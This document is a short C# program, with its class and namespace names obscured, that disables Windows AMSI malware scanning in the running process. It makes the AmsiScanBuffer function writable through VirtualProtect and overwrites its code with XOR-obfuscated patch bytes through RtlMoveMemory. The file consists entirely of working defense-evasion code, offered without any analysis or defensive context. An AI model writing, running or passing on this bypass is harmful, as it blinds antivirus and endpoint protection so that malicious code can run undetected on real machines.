using System;
using System.Runtime.InteropServices;

namespace B
{
    public class A
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr mvmem
        (IntPtr dest, IntPtr src, int size);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr vproc
        (IntPtr lpAddress, uint dwSize,
                uint flNewProtect, IntPtr lpflOldProtect);


        public static int Main()
        {

            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer"); 
            IntPtr OldProtection = Marshal.AllocHGlobal(4);


            string DllName = "kernel32.dll";
            string FuncName = "VirtualProtect";
            IntPtr hModule = LoadLibrary(DllName);
            IntPtr intPtr = GetProcAddress(hModule, FuncName);
            vproc vp = (vproc)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(vproc));
            vp(AmsiScanBufrPtr, 0x0015, 0x40, OldProtection);

            string DllName2 = "kernel32.dll";
            string FuncName2 = "RtlMoveMemory";
            IntPtr hModule2 = LoadLibrary(DllName2);
            IntPtr intPtr2 = GetProcAddress(hModule2, FuncName2);
            mvmem mm = (mvmem)Marshal.GetDelegateForFunctionPointer(intPtr2, typeof(mvmem));

            Byte[] xPatch = { 0x50, 0x8c, 0xf6 };
            var xkey = "asfgkqpaldjdjhs";
            byte[] Patch = XORCipher(xPatch, xkey);

            unsafe
            {
                fixed (byte* p = Patch)
                {
                    IntPtr unmanagedPointer = (IntPtr)p;
                    mm(AmsiScanBufrPtr + 0x001b, unmanagedPointer, Patch.Length);
                }
            }

            return 0;
        }
        static byte[] XORCipher(byte[] xpatch, string xkey)
        {
            int patchLen = xpatch.Length;
            int xkeyLen = xkey.Length;
            byte[] output = new byte[patchLen];

            for (int i = 0; i < patchLen; ++i)
            {
                output[i] = (byte)(xpatch[i] ^ xkey[i]);
            }

            return output;
        }
    }
}
